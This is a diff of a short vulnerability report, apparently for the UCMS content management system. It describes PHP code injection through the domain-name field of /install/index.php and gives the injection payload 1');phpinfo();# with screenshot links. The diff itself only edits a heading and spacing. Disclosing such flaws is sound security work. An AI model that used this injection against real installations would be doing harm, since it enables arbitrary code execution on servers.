@@ -12,8 +12,9 @@ The vulnerability located in the /install/index.php.
 ![imgage](https://github.com/blackstar24/UCMS/blob/master/6.png) 
 ## Vulnerability Description:
 When in the progress of installing.The systemdomain name control is not strict during installation, which can lead to PHP code executed.
-## payload
+## Payload
 1');phpinfo();#
+
 ![imgage](https://github.com/blackstar24/UCMS/blob/master/7.png) 
 ![imgage](https://github.com/blackstar24/UCMS/blob/master/8.png) 
 ![imgage](https://github.com/blackstar24/UCMS/blob/master/9.png)
